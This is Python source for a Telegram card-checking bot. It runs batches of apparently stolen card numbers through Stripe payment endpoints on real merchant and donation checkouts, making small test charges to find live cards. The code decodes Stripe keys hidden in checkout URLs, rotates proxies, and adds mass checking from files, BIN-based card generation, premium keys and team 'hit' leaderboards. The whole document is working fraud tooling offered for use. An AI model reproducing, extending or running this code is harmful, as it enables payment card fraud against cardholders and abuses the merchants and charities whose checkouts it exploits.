        async with aiohttp.ClientSession(connector=connector, timeout=timeout, cookies=static_cookies) as session:

            cart_token = None
            for attempt in range(3):
                try:
                    async with session.post(cart_url_5, headers=cart_headers_5, data=cart_payload, proxy=proxy_url, ssl=False) as rc:
                        if rc.status != 200:
                            cj = await rc.json(content_type=None)
                            err = cj.get("error", {}).get("message", f"HTTP_{rc.status}")
                            if attempt == 2:
                                return {'success': False, 'status': 'ERROR', 'message': f'CART_FAIL: {err}', 'is_chargeable': None, 'time': time.time() - start}
                            continue
                        cj = await rc.json(content_type=None)
                    redirect = cj.get("redirectUrlPath", "")
                    m = re.search(r'cartToken=([^&]+)', redirect)
                    if not m:
                        if attempt == 2:
                            return {'success': False, 'status': 'ERROR', 'message': 'CART_PARSE_FAIL', 'is_chargeable': None, 'time': time.time() - start}
                        continue
                    cart_token = m.group(1)
                    break
                except Exception as ex:
                    if attempt == 2:
                        return {'success': False, 'status': 'ERROR', 'message': f'CART_CONN: {str(ex)[:40]}', 'is_chargeable': None, 'time': time.time() - start}

            if not cart_token:
                return {'success': False, 'status': 'ERROR', 'message': 'CART_TOKEN_FAIL', 'is_chargeable': None, 'time': time.time() - start}

            async with session.post("https://api.stripe.com/v1/payment_methods", headers=stripe_headers_5, data=stripe_data_5, proxy=proxy_url, ssl=False) as rp:
                try:
                    pm_json = await rp.json(content_type=None)
                except Exception:
                    pm_json = {}
                if rp.status != 200 or 'id' not in pm_json:
                    err_msg = pm_json.get("error", {}).get("message", "PM_CREATE_FAIL") if pm_json else "PM_CREATE_FAIL"
                    return {'success': False, 'status': 'DECLINED', 'message': err_msg, 'is_chargeable': False, 'time': time.time() - start}
                pid = pm_json['id']

            for attempt in range(3):
                order_data = dict(order_base_5)
                order_data["cartToken"] = cart_token
                order_data["paymentToken"] = {"stripePaymentTokenType": "PAYMENT_METHOD_ID", "token": pid, "type": "STRIPE"}

                req_h = dict(order_headers_5)
                req_h["referer"] = f"https://www.onamissionkc.org/checkout?cartToken={cart_token}"

                try:
                    async with session.post(f"{MERCHANT_BASE_5}/api/2/commerce/orders", headers=req_h, json=order_data, proxy=proxy_url, ssl=False) as ro:
                        http_code = ro.status
                        try:
                            result = await ro.json(content_type=None)
                        except Exception:
                            result = {}
                except Exception as ex:
                    if attempt == 2:
                        return {'success': False, 'status': 'ERROR', 'message': f'ORDER_FAIL: {str(ex)[:40]}', 'is_chargeable': None, 'time': time.time() - start}
                    continue

                if http_code == 200 and "failureType" not in result:
                    return {'success': True, 'status': 'CHARGED', 'message': 'Charged $1 successfully', 'is_chargeable': True, 'time': time.time() - start}

                failure_type = result.get("failureType", "")
                if failure_type in ["CART_ALREADY_PURCHASED", "CART_MISSING", "STALE_USER_SESSION"]:
                    if attempt == 2:
                        return {'success': False, 'status': 'ERROR', 'message': failure_type, 'is_chargeable': None, 'time': time.time() - start}
                    try:
                        async with session.post(cart_url_5, headers=cart_headers_5, data=cart_payload, proxy=proxy_url, ssl=False) as rcr:
                            rcj = await rcr.json(content_type=None)
                        redirect = rcj.get("redirectUrlPath", "")
                        mr = re.search(r'cartToken=([^&]+)', redirect)
                        if mr:
                            cart_token = mr.group(1)
                    except Exception:
                        pass
                    continue
                else:
                    err_msg = failure_type if failure_type else result.get("message", "Your card was declined")
                    return {'success': False, 'status': 'DECLINED', 'message': err_msg, 'is_chargeable': False, 'time': time.time() - start}

            return {'success': False, 'status': 'ERROR', 'message': 'ORDER_MAX_RETRIES', 'is_chargeable': None, 'time': time.time() - start}

    except asyncio.TimeoutError:
        return {'success': False, 'status': 'ERROR', 'message': 'TIMEOUT', 'is_chargeable': None, 'time': time.time() - start}
    except Exception as e:
        return {'success': False, 'status': 'ERROR', 'message': str(e)[:50], 'is_chargeable': None, 'time': time.time() - start}

def _autohit_xor(data, key):
    return ''.join(chr(ord(c) ^ key) for c in data)

def _autohit_decode_url(checkout_url):
    try:
        import urllib.parse, base64
        encoded_part = checkout_url.split("#")[1]
        url_decoded = urllib.parse.unquote(encoded_part)
        base64_decoded = base64.b64decode(url_decoded).decode('latin-1')
        pk_pattern = r'pk_(test|live)_[A-Za-z0-9_]+'
        for xor_key in [5, 3, 4, 6, 7]:
            xored = _autohit_xor(base64_decoded, xor_key)
            m = re.search(pk_pattern, xored)
            if m:
                return m.group()
        m = re.search(pk_pattern, base64_decoded)
        return m.group() if m else None
    except Exception:
        return None

async def autohit_init(checkout_url: str, proxy_url: str = None):
    pk_live = _autohit_decode_url(checkout_url)
    cs_m = re.search(r'cs_live_[a-zA-Z0-9]+', checkout_url)
    if not pk_live or not cs_m:
        return None, None, None
    cs_live = cs_m.group(0)

    ua = "Mozilla/5.0 (Linux; Android 13; SM-G991B) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Mobile Safari/537.36"
    init_headers = {
        "User-Agent": ua,
        "Accept": "application/json, text/plain, */*",
        "Accept-Language": "es-ES,es;q=0.9",
        "Content-Type": "application/x-www-form-urlencoded",
        "Origin": "https://checkout.stripe.com",
        "Referer": "https://checkout.stripe.com/",
        "Sec-Fetch-Dest": "empty",
        "Sec-Fetch-Mode": "cors",
        "Sec-Fetch-Site": "same-site",
    }
    connector = aiohttp.TCPConnector(ssl=False)
    timeout = aiohttp.ClientTimeout(total=30)
    try:
        async with aiohttp.ClientSession(connector=connector, timeout=timeout) as session:
            init_data_payload = {
                "key": pk_live,
                "eid": "NA",
                "browser_locale": "es-ES",
                "browser_timezone": "America/Bogota",
                "redirect_type": "url",
            }
            async with session.post(
                f"https://api.stripe.com/v1/payment_pages/{cs_live}/init",
                headers=init_headers,
                data=init_data_payload,
                proxy=proxy_url,
                ssl=False,
            ) as r:
                if r.status != 200:
                    return None, None, None
                init_data = await r.json(content_type=None)
        return pk_live, cs_live, init_data
    except Exception:
        return None, None, None

async def autohit_check_card(card_data: dict, pk_live: str, cs_live: str, init_data: dict, proxy_url: str = None) -> dict:
    import uuid as _uuid
    start = time.time()

    cc = card_data['number']
    mm = card_data['month']
    yy = card_data['year']
    cvv = card_data['cvv']

    customer_block = init_data.get("customer")
    if isinstance(customer_block, dict):
        customer_email = customer_block.get("email") or init_data.get("customer_email") or "customer@example.com"
        customer_name = customer_block.get("name") or "Customer"
        customer_country = (customer_block.get("address") or {}).get("country", "US")
    else:
        customer_email = init_data.get("customer_email") or "customer@example.com"
        customer_name = "Customer"
        customer_country = "US"

    eid = init_data.get("eid", "NA")
    config_id = init_data.get("config_id", "")

    ua = "Mozilla/5.0 (Linux; Android 13; SM-G991B) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Mobile Safari/537.36"
    base_headers = {
        "User-Agent": ua,
        "Accept": "application/json, text/plain, */*",
        "Accept-Language": "es-ES,es;q=0.9",
        "Content-Type": "application/x-www-form-urlencoded",
        "Origin": "https://checkout.stripe.com",
        "Referer": f"https://checkout.stripe.com/c/pay/{cs_live}",
        "Sec-Fetch-Dest": "empty",
        "Sec-Fetch-Mode": "cors",
        "Sec-Fetch-Site": "same-site",
    }

    pm_payload = {
        "type": "card",
        "card[number]": cc,
        "card[cvc]": cvv,
        "card[exp_month]": mm,
        "card[exp_year]": yy,
        "billing_details[name]": customer_name,
        "billing_details[email]": customer_email,
        "billing_details[address][country]": customer_country,
        "billing_details[address][postal_code]": "10080",
        "key": pk_live,
        "client_attribution_metadata[client_session_id]": eid,
        "client_attribution_metadata[checkout_session_id]": cs_live,
        "client_attribution_metadata[merchant_integration_source]": "checkout",
        "client_attribution_metadata[merchant_integration_version]": "hosted_checkout",
        "client_attribution_metadata[payment_method_selection_flow]": "merchant_specified",
        "client_attribution_metadata[checkout_config_id]": config_id,
    }

    connector = aiohttp.TCPConnector(ssl=False)
    timeout = aiohttp.ClientTimeout(total=45)
    try:
        async with aiohttp.ClientSession(connector=connector, timeout=timeout) as session:
            async with session.post(
                "https://api.stripe.com/v1/payment_methods",
                headers=base_headers,
                data=pm_payload,
                proxy=proxy_url,
                ssl=False,
            ) as pm_r:
                pm_status = pm_r.status
                try:
                    pm_data = await pm_r.json(content_type=None)
                except Exception:
                    pm_data = {}

            if pm_status != 200 or not pm_data.get("id", "").startswith("pm_"):
                err = pm_data.get("error", {}) if pm_data else {}
                msg = err.get("message", "PM_CREATE_FAIL") if isinstance(err, dict) else "PM_CREATE_FAIL"
                dc = err.get("decline_code", "") if isinstance(err, dict) else ""
                full_msg = f"{msg} ({dc})" if dc else msg
                return {'success': False, 'status': 'DECLINED', 'message': full_msg, 'is_chargeable': False, 'time': time.time() - start}

            pm_id = pm_data["id"]

            expected_amount = None
            if init_data.get("invoice"):
                expected_amount = init_data["invoice"].get("amount_due")

            confirm_payload = {
                "eid": "NA",
                "payment_method": pm_id,
                "expected_payment_method_type": "card",
                "key": pk_live,
                "referrer": init_data.get("success_url") or "https://checkout.stripe.com",
                "client_attribution_metadata[client_session_id]": eid,
                "client_attribution_metadata[checkout_session_id]": cs_live,
                "client_attribution_metadata[merchant_integration_source]": "checkout",
                "client_attribution_metadata[merchant_integration_version]": "hosted_checkout",
                "client_attribution_metadata[payment_method_selection_flow]": "merchant_specified",
                "client_attribution_metadata[checkout_config_id]": config_id,
            }
            if expected_amount is not None:
                confirm_payload["expected_amount"] = expected_amount

            confirm_headers = dict(base_headers)
            confirm_headers["Idempotency-Key"] = str(_uuid.uuid4())

            async with session.post(
                f"https://api.stripe.com/v1/payment_pages/{cs_live}/confirm",
                headers=confirm_headers,
                data=confirm_payload,
                proxy=proxy_url,
                ssl=False,
            ) as conf_r:
                conf_status = conf_r.status
                try:
                    conf_data = await conf_r.json(content_type=None)
                except Exception:
                    conf_data = {}

            if conf_status == 200 and conf_data:
                pi = conf_data.get("payment_intent", {})
                status_val = pi.get("status", "") if isinstance(pi, dict) else ""
                if status_val == "succeeded":
                    return {'success': True, 'status': 'APPROVED', 'message': 'Payment succeeded', 'is_chargeable': True, 'time': time.time() - start}
                elif status_val == "requires_action":
                    return {'success': False, 'status': '3DS', 'message': '3DS_REQUIRED', 'is_chargeable': True, 'time': time.time() - start}
                else:
                    return {'success': False, 'status': status_val.upper() or 'UNKNOWN', 'message': status_val, 'is_chargeable': False, 'time': time.time() - start}
            else:
                err = conf_data.get("error", {}) if conf_data else {}
                msg = err.get("message", "CONFIRM_FAIL") if isinstance(err, dict) else "CONFIRM_FAIL"
                dc = err.get("decline_code", "") if isinstance(err, dict) else ""
                full_msg = f"{msg} ({dc})" if dc else msg
                return {'success': False, 'status': 'DECLINED', 'message': full_msg, 'is_chargeable': False, 'time': time.time() - start}

    except asyncio.TimeoutError:
        return {'success': False, 'status': 'ERROR', 'message': 'TIMEOUT', 'is_chargeable': None, 'time': time.time() - start}
    except Exception as e:
        return {'success': False, 'status': 'ERROR', 'message': str(e)[:50], 'is_chargeable': None, 'time': time.time() - start}

# ═══════════════════════════════════════════════════════════════
#                    NEW STRIPE UHQ GATES
# ═══════════════════════════════════════════════════════════════

def format_proxy_for_tls(proxy_input: str) -> str:
    """
    Convert any proxy format to http://user:pass@ip:port for TLS proxy

    Supported input formats:
    - ip:port:user:pass -> http://user:pass@ip:port
    - ip:port           -> http://ip:port
    - user:pass@ip:port -> http://user:pass@ip:port
    - http://...        -> as-is
    """
    if not proxy_input:
        return ""

    proxy_input = proxy_input.strip()

    # Already has protocol - return as-is
    if proxy_input.startswith(('http://', 'https://', 'socks4://', 'socks5://')):
        return proxy_input

    # Has @ symbol - user:pass@ip:port format
    if '@' in proxy_input:
        return f'http://{proxy_input}'

    # Split by colon to determine format
    parts = proxy_input.split(':')

    if len(parts) == 4:
        # ip:port:user:pass -> http://user:pass@ip:port
        ip, port, user, password = parts
        return f'http://{user}:{password}@{ip}:{port}'
    elif len(parts) == 2:
        # ip:port -> http://ip:port
        return f'http://{proxy_input}'
    else:
        # Unknown format, try adding http://
        return f'http://{proxy_input}'

def parse_card(card_input: str) -> Optional[dict]:
    """Parse card - ONLY accepts CC|MM|YY|CVV or CC|MM|YYYY|CVV format"""
    try:
        card_input = card_input.strip()

        # Only accept | separator
        if '|' not in card_input:
            return None

        parts = card_input.split('|')

        # Must have exactly 4 parts
        if len(parts) != 4:
            return None

        cc = re.sub(r'\D', '', parts[0])
        mm_str = parts[1].strip()
        yy_str = parts[2].strip()
        cvv = parts[3].strip()

        # Validate card number length
        if len(cc) < 13 or len(cc) > 19:
            return None

        # Validate month (must be 1-2 digits)
        if not mm_str.isdigit() or len(mm_str) > 2:
            return None
        mm = int(mm_str)
        if mm < 1 or mm > 12:
            return None

        # Validate year (must be 2 or 4 digits only)
        if not yy_str.isdigit():
            return None
        if len(yy_str) not in [2, 4]:
            return None

        yy = int(yy_str)
        if len(yy_str) == 2:
            yy = 2000 + yy if yy < 50 else 1900 + yy

        # Validate CVV (3-4 digits)
        if not cvv.isdigit() or len(cvv) < 3 or len(cvv) > 4:
            return None

        return {"number": cc, "month": mm, "year": yy, "cvv": cvv, "name": "Card Holder"}
    except:
        return None

def luhn_check(card_number: str) -> bool:
    """Validate card number using Luhn algorithm"""
    def digits_of(n):
        return [int(d) for d in str(n)]
    digits = digits_of(card_number)
    odd_digits = digits[-1::-2]
    even_digits = digits[-2::-2]
    checksum = sum(odd_digits)
    for d in even_digits:
        checksum += sum(digits_of(d * 2))
    return checksum % 10 == 0

#                      BOT COMMANDS
# ═══════════════════════════════════════════════════════════════

def is_owner(user) -> bool:
    """Check if user is owner"""
    return user.username and user.username.lower() == OWNER_USERNAME.lower()

@dp.message(Command("start"))
async def cmd_start(message: Message):
    user = message.from_user
    db.get_or_create_user(user.id, user.username, user.first_name)

    # main menu buttons with stylish text
    keyboard = InlineKeyboardMarkup(inline_keyboard=[
        [InlineKeyboardButton(text="𝙶𝙰𝚃𝙴𝚂", callback_data="main_gates"),
         InlineKeyboardButton(text="𝚃𝙾𝙾𝙻𝚂", callback_data="main_cmds")],
        [InlineKeyboardButton(text="𝙿𝚁𝙾𝙵𝙸𝙻𝙴", callback_data="main_profile"),
         InlineKeyboardButton(text="𝚃𝙾𝙿", callback_data="main_top")],
        [InlineKeyboardButton(text="𝙴𝚇𝙸𝚃", callback_data="close_menu")]
    ])

    txt = f"""<b>H 𝗖𝗛𝗘𝗖𝗞𝗘𝗥 𝗔𝘄𝗮𝗶𝘁𝘀 𝗬𝗼𝘂!</b>
- - - - - - - - - - - - - - - - - - - - - - - - - -
✦ 𝙵𝚊𝚜𝚝 𝙶𝚊𝚝𝚎, 𝙱𝚎𝚝𝚝𝚎𝚛 𝚁𝚎𝚜𝚙𝚘𝚗𝚜𝚎.
✦ 𝙵𝚛𝚎𝚎 + 𝙿𝚛𝚎𝚖𝚒𝚞𝚖 𝙶𝚊𝚝𝚎𝚜 𝚊𝚗𝚍 𝚃𝚘𝚘𝚕𝚜.
✦ 𝙲𝚘𝚖𝚙𝚕𝚎𝚝𝚎 𝙱𝚘𝚝 𝙵𝚘𝚛 𝚈𝚘𝚞𝚛 𝙿𝚞𝚛𝚙𝚘𝚜𝚎.
- - - - - - - - - - - - - - - - - - - - - - - - - -
𝚃𝚑𝚎 𝙱𝚘𝚝 𝙰𝚠𝚊𝚒𝚝𝚜 𝚈𝚘𝚞𝚛 𝙲𝚘𝚖𝚖𝚊𝚗𝚍, 𝙼𝚢 𝙻𝚘𝚛𝚍 ⚔️

<a href="tg://resolve?domain={BOT_USERNAME}">@{BOT_USERNAME}</a>"""

    await message.reply(txt, reply_markup=keyboard, disable_web_page_preview=True)

@dp.message(Command("cmds", "help", "commands"))
async def cmd_help(message: Message):
    user = message.from_user

    txt = """<b>𝙲𝙾𝙼𝙼𝙰𝙽𝙳𝚂</b>

<u>checker</u>
/chk - check single card
/mchk - mass check (paste cards)
/mtxt - mass check from file
/gen - generate cc from bin
/multibin - gen from multiple bins
/bin - lookup bin info

<u>tools</u>
/clean - extract ccs from text
/dupe - remove duplicates
/filter - filter by BIN
/exp - filter by expiry
/split - split for team
/fake - generate fake info

<u>proxy</u>
/setproxy - set & validate proxy
/proxy - view proxy status
/testproxy - test proxy health
/clearproxy - remove proxy

<u>team</u>
/live - recent live hits
/today - daily team stats
/top - leaderboard

<u>gates</u>
/gates - all available gates
/mygates - your gates
/addgate - add new gate
/editgate - edit gate
/delgate - remove gate

<u>account</u>
/me - your stats
/tier - your limits
/last - recent checks"""

    # non-premium users see how to get premium
    if not db.is_premium(user.id) and not is_owner(user):
        txt += f"""

<u>premium</u>
/redeem KEY - use premium key
dm @{OWNER_USERNAME} for keys"""

    # owner sees admin stuff
    if is_owner(user):
        txt += """

<u>admin</u>
/genkey - generate premium keys
/keys - view all keys
/ban /unban - manage users
/stats - bot stats
/rotsh - rotating check
/massgate - mass add gates"""

    txt += """

<i>Potatoes 🔥</i>
<i>prefixes: / . ! " all work</i>"""

    keyboard = InlineKeyboardMarkup(inline_keyboard=[
        [InlineKeyboardButton(text="Back", callback_data="back_start"),
         InlineKeyboardButton(text="Close", callback_data="close_menu")]
    ])

    await message.reply(txt, reply_markup=keyboard)

# ═══════════════════════════════════════════════════════════════
#                    GATES COMMAND
# ═══════════════════════════════════════════════════════════════

@dp.message(Command("gates", "mygates"))
async def cmd_gates(message: Message):
    txt = """<b>💳 STRIPE UHQ GATES</b>

💷 <b>STRIPE UHQ $1 (GBP)</b>
<code>/str1</code> — single check
<code>/mstr1</code> — mass check
<code>/mstr1txt</code> — mass from file

💵 <b>STRIPE UHQ $5 (NZD)</b>
<code>/str2</code> — single check
<code>/mstr2</code> — mass check
<code>/mstr2txt</code> — mass from file

💰 <b>STRIPE DONATION $3 (USD)</b>
<code>/str4</code> — single check
<code>/mstr4</code> — mass check
<code>/mstr4txt</code> — mass from file

🔐 <b>STRIPE AUTH</b>
<code>/str</code> — single check
<code>/mstr</code> — mass check
<code>/mstrtxt</code> — mass from file

💲 <b>STRIPE $1 (USD)</b>
<code>/str5</code> — single check
<code>/mstr5</code> — mass check
<code>/mstr5txt</code> — mass from file"""

    keyboard = InlineKeyboardMarkup(inline_keyboard=[
        [InlineKeyboardButton(text="Close", callback_data="close_menu")]
    ])
    await message.reply(txt, reply_markup=keyboard)

# ═══════════════════════════════════════════════════════════════
#                    STR4 COMMAND
# ═══════════════════════════════════════════════════════════════

@dp.message(Command("str4"))
async def cmd_str4(message: Message):
    """STR4 - Stripe Donation Gate $3 charge"""
    user = message.from_user
    
    if db.is_banned(user.id):
        await message.reply("❌ You are banned")
        return
    
    db.get_or_create_user(user.id, user.username, user.first_name)
    
    args = message.text.split(maxsplit=1)
    card_data = None
    
    if len(args) >= 2:
        card_data = parse_card(args[1])
    
    if not card_data and message.reply_to_message:
        reply_text = message.reply_to_message.text or message.reply_to_message.caption or ""
        extracted = extract_cards_from_text(reply_text)
        if extracted:
            card_data = extracted[0]
        elif reply_text:
            card_data = parse_card(reply_text.strip())
    
    if not card_data:
        await message.reply(f"""<b>💳 STR4</b>

<b>Usage:</b> <code>/str4 CC|MM|YY|CVV</code>

<b>Response Format:</b>
✅ status: "succeeded" = CHARGED
⚠️ status: "requires_action" = 3DS
❌ Decline message in response

<b>Mass Check:</b>
<code>/mstr4</code> - paste cards
<code>/mstr4txt</code> - reply to .txt file""")
        return
    
    if not luhn_check(card_data['number']):
        await message.reply("❌ Invalid card number (Luhn check failed)")
        return
    
    # Check proxy status
    user_proxy = await proxy_manager.get_proxy_url(user.id)
    proxy_status = "🔒 Proxy" if user_proxy else "🌐 No Proxy"
    
    record_check(user.id)
    
    card_display = format_card_display(card_data['number'], card_data['month'], card_data['year'], card_data['cvv'])
    
    msg = await message.reply(f"""⏳ <b>Checking...</b>

<b>Card:</b> <code>{card_display}</code>
<b>Gate:</b> STR4
<b>Connection:</b> {proxy_status}""")
    
    bin_info = await lookup_bin(card_data['number'])
    
    # Use retry wrapper for reliability (pass proxy if set)
    result = await stripe_gate_with_retry(check_card_stripe_donation, card_data, user_proxy, True)
    
    status = result.get('status', 'UNKNOWN')
    result_msg = result.get('message', '')
    is_chargeable = result.get('is_chargeable')
    
    # Determine emoji and status tag
    if status == 'CHARGED':
        emoji = '🔥'
        status_tag = 'CHARGED'
        is_live = True
    elif status == '3DS':
        emoji = '✅'
        status_tag = 'Approved ⇾ 3DS'
        is_live = True
    elif status == 'DECLINED':
        emoji = '❌'
        status_tag = 'DECLINED'
        is_live = False
    else:
        emoji = '⚠️'
        status_tag = status
        is_live = False
    
    # Update stats
    db.update_user_stats(user.id, is_live)
    db.update_gateway_stats('str4', is_live)
    db.add_check_history(user.id, card_data['number'][:6], card_data['number'][-4:], 'str4', status, result_msg, result.get('time', 0))
    
    tier = db.get_user_tier(user.id, user.username)
    tier_display = tier.capitalize()
    
    response = f"""<b>STR4</b> {emoji}
━━━━━━━━━━━━━━━━━━━━━
<b>Card:</b> <code>{card_display}</code>
<b>Status:</b> {status_tag} {emoji}
<b>Response:</b> {result_msg}

<b>BIN:</b> {bin_info['brand']} - {bin_info['type']} - {bin_info['level']}
<b>Bank:</b> {bin_info['bank'][:30]}
<b>Country:</b> {bin_info['emoji']} {bin_info['country']}

<b>Gate:</b> /str4
<b>Time:</b> {result.get('time', 0):.2f}s
<b>Checked By:</b> @{user.username or user.first_name} [{tier_display}]
━━━━━━━━━━━━━━━━━━━━━"""
    
    await msg.edit_text(response)

@dp.message(Command("mstr4"))
async def cmd_mstr4(message: Message):
    """Mass check STR4 gate"""
    user = message.from_user
    
    if db.is_banned(user.id):
        await message.reply("❌ Banned")
        return
    
    db.get_or_create_user(user.id, user.username, user.first_name)
    tier = db.get_user_tier(user.id)
    limits = get_tier_limits(tier)
    max_cards = limits['mchk']
    
    args = message.text.split(maxsplit=1)
    if len(args) < 2:
        await message.reply(f"""<b>MASS CHECK - /str4</b>

<b>Usage:</b> <code>/mstr4 CC|MM|YY|CVV</code>
(one per line or comma separated)

<b>Limit:</b> {max_cards} cards""")
        return
    
    cards = extract_cards_from_text(args[1])
    if not cards:
        lines = re.split(r'[\n,]+', args[1])
        for line in lines:
            line = line.strip()
            if line:
                card = parse_card(line)
                if card and luhn_check(card['number']):
                    cards.append(card)
                if len(cards) >= max_cards:
                    break
    else:
        cards = cards[:max_cards]
    
    if not cards:
        await message.reply("❌ No valid cards found")
        return
    
    total = len(cards)
    stats = {'charged': 0, '3ds': 0, 'dead': 0}
    live_cards = []
    
    msg = await message.reply(f"""<b>Processing...</b> 0/{total}

CHARGED: 0 | 3DS: 0 | DEAD: 0

<b>Gate:</b> /str4""")
    
    for i, card in enumerate(cards):
        card_display = format_card_display(card['number'], card['month'], card['year'], card['cvv'])
        
        try:
            result = await stripe_gate_with_retry(check_card_stripe_donation, card, None, i == 0)
            status = result.get('status', 'UNKNOWN')
            result_msg = result.get('message', '')
            
            if status == 'CHARGED':
                stats['charged'] += 1
                live_cards.append((card_display, 'CHARGED', result_msg))
                db.update_user_stats(user.id, True)
                db.update_gateway_stats('str4', True)
                
                # Send hit notification
                bin_info = await lookup_bin(card['number'])
                await message.reply(f"""🔥 <b>CHARGED!</b> /str4

<code>{card_display}</code>
{result_msg}

{bin_info['brand']} | {bin_info['bank'][:20]}
{bin_info['emoji']} {bin_info['country']}""")
                
            elif status == '3DS':
                stats['3ds'] += 1
                live_cards.append((card_display, '3DS', result_msg))
                db.update_user_stats(user.id, True)
                db.update_gateway_stats('str4', True)
            else:
                stats['dead'] += 1
                db.update_user_stats(user.id, False)
                db.update_gateway_stats('str4', False)
            
            db.add_check_history(user.id, card['number'][:6], card['number'][-4:], 'str4', status, result_msg, result.get('time', 0))
            
        except Exception as e:
            stats['dead'] += 1
        
        if (i + 1) % 2 == 0 or i == total - 1:
            try:
                await msg.edit_text(f"""<b>Processing...</b> {i + 1}/{total}

CHARGED: {stats['charged']} | 3DS: {stats['3ds']} | DEAD: {stats['dead']}

<b>Gate:</b> /str4""")
            except:
                pass
        
        await asyncio.sleep(0.5)
    
    # Final summary
    tier = db.get_user_tier(user.id, user.username)
    
    final_response = f"""<b>Completed</b> {total}/{total}

CHARGED: {stats['charged']} | 3DS: {stats['3ds']} | DEAD: {stats['dead']}

<b>Gate:</b> /str4
<b>Checked By:</b> @{user.username or user.first_name} [{tier.upper()}]"""
    
    await msg.edit_text(final_response)

@dp.message(Command("mstr4txt"))
async def cmd_mstr4txt(message: Message):
    """Mass check STR4 from txt file"""
    user = message.from_user
    
    if db.is_banned(user.id):
        await message.reply("❌ Banned")
        return
    
    db.get_or_create_user(user.id, user.username, user.first_name)
    tier = db.get_user_tier(user.id)
    limits = get_tier_limits(tier)
    max_cards = limits['mtxt']
    
    if not message.reply_to_message or not message.reply_to_message.document:
        await message.reply(f"""<b>MASS TXT - /str4</b>

<b>Usage:</b> Reply to a .txt file with <code>/mstr4txt</code>

<b>Limit:</b> {max_cards} cards""")
        return
    
    doc = message.reply_to_message.document
    if not doc.file_name.endswith('.txt'):
        await message.reply("❌ Please send a .txt file")
        return
    
    try:
        file = await bot.get_file(doc.file_id)
        file_content = await bot.download_file(file.file_path)
        content = file_content.read().decode('utf-8', errors='ignore')
    except Exception as e:
        await message.reply(f"❌ Failed to read file: {str(e)[:50]}")
        return
    
    cards = extract_cards_from_text(content)
    if not cards:
        lines = content.strip().split('\n')
        for line in lines:
            line = line.strip()
            if line:
                card = parse_card(line)
                if card and luhn_check(card['number']):
                    cards.append(card)
                if len(cards) >= max_cards:
                    break
    else:
        cards = cards[:max_cards]
    
    if not cards:
        await message.reply("❌ No valid cards in file")
        return
    
    total = len(cards)
    stats = {'charged': 0, '3ds': 0, 'dead': 0}
    live_cards = []
    
    task_id, cancel_event = await task_manager.register(user.id, 'str4', total)
    
    msg = await message.reply(f"""<b>Processing...</b> 0/{total}

CHARGED: 0 | 3DS: 0 | DEAD: 0

<b>Gate:</b> /str4
<b>Task ID:</b> <code>{task_id}</code>
<b>Stop:</b> <code>/stop {task_id}</code>""")
    
    try:
        for i, card in enumerate(cards):
            if cancel_event.is_set():
                break
            
            card_display = format_card_display(card['number'], card['month'], card['year'], card['cvv'])
            
            try:
                result = await stripe_gate_with_retry(check_card_stripe_donation, card, None, i == 0)
                status = result.get('status', 'UNKNOWN')
                result_msg = result.get('message', '')
                
                if status == 'CHARGED':
                    stats['charged'] += 1
                    live_cards.append((card_display, 'CHARGED', result_msg))
                    db.update_user_stats(user.id, True)
                    db.update_gateway_stats('str4', True)
                    
                    bin_info = await lookup_bin(card['number'])
                    await message.reply(f"""🔥 <b>CHARGED!</b> /str4

<code>{card_display}</code>
{result_msg}

{bin_info['brand']} | {bin_info['bank'][:20]}
{bin_info['emoji']} {bin_info['country']}""")
                    
                elif status == '3DS':
                    stats['3ds'] += 1
                    live_cards.append((card_display, '3DS', result_msg))
                    db.update_user_stats(user.id, True)
                    db.update_gateway_stats('str4', True)
                else:
                    stats['dead'] += 1
                    db.update_user_stats(user.id, False)
                    db.update_gateway_stats('str4', False)
                
                db.add_check_history(user.id, card['number'][:6], card['number'][-4:], 'str4', status, result_msg, result.get('time', 0))
                
            except Exception as e:
                stats['dead'] += 1
            
            await task_manager.update_progress(task_id, i + 1)
            
            if (i + 1) % 2 == 0 or i == total - 1:
                try:
                    await msg.edit_text(f"""<b>Processing...</b> {i + 1}/{total}

CHARGED: {stats['charged']} | 3DS: {stats['3ds']} | DEAD: {stats['dead']}

<b>Gate:</b> /str4
<b>Task ID:</b> <code>{task_id}</code>
<b>Stop:</b> <code>/stop {task_id}</code>""")
                except:
                    pass
            
            await asyncio.sleep(0.5)
        
        tier = db.get_user_tier(user.id, user.username)
        
        final_response = f"""<b>Completed</b> {total}/{total}

CHARGED: {stats['charged']} | 3DS: {stats['3ds']} | DEAD: {stats['dead']}

<b>Gate:</b> /str4
<b>Checked By:</b> @{user.username or user.first_name} [{tier.upper()}]"""
        
        await msg.edit_text(final_response)
        
    finally:
        await task_manager.unregister(task_id)

@dp.message(Command("str"))
async def cmd_str(message: Message):
    user = message.from_user

    if db.is_banned(user.id):
        await message.reply("❌ You are banned")
        return

    db.get_or_create_user(user.id, user.username, user.first_name)

    args = message.text.split(maxsplit=1)
    card_data = None

    if len(args) >= 2:
        card_data = parse_card(args[1])

    if not card_data and message.reply_to_message:
        reply_text = message.reply_to_message.text or message.reply_to_message.caption or ""
        extracted = extract_cards_from_text(reply_text)
        if extracted:
            card_data = extracted[0]
        elif reply_text:
            card_data = parse_card(reply_text.strip())

    if not card_data:
        await message.reply("""<b>💳 STR - Stripe Auth</b>

<b>Usage:</b> <code>/str CC|MM|YY|CVV</code>

<b>Response Format:</b>
✅ status: "success" = APPROVED
⚠️ status: "requires_action" = 3DS
❌ Decline message in response

<b>Mass Check:</b>
<code>/mstr</code> - paste cards
<code>/mstrtxt</code> - reply to .txt file""")
        return

    if not luhn_check(card_data['number']):
        await message.reply("❌ Invalid card number (Luhn check failed)")
        return

    user_proxy = await proxy_manager.get_proxy_url(user.id)
    proxy_status = "🔒 Proxy" if user_proxy else "🌐 No Proxy"

    record_check(user.id)

    card_display = format_card_display(card_data['number'], card_data['month'], card_data['year'], card_data['cvv'])

    msg = await message.reply(f"""⏳ <b>Checking...</b>

<b>Card:</b> <code>{card_display}</code>
<b>Gate:</b> STR
<b>Connection:</b> {proxy_status}""")

    bin_info = await lookup_bin(card_data['number'])

    result = await stripe_gate_with_retry(check_card_stripe_auth, card_data, user_proxy, True)

    status = result.get('status', 'UNKNOWN')
    result_msg = result.get('message', '')
    is_chargeable = result.get('is_chargeable')

    if status == 'APPROVED':
        emoji = '✅'
        status_tag = 'APPROVED'
        is_live = True
    elif status == '3DS':
        emoji = '✅'
        status_tag = 'Approved ⇾ 3DS'
        is_live = True
    elif status == 'DECLINED':
        emoji = '❌'
        status_tag = 'DECLINED'
        is_live = False
    else:
        emoji = '⚠️'
        status_tag = status
        is_live = False

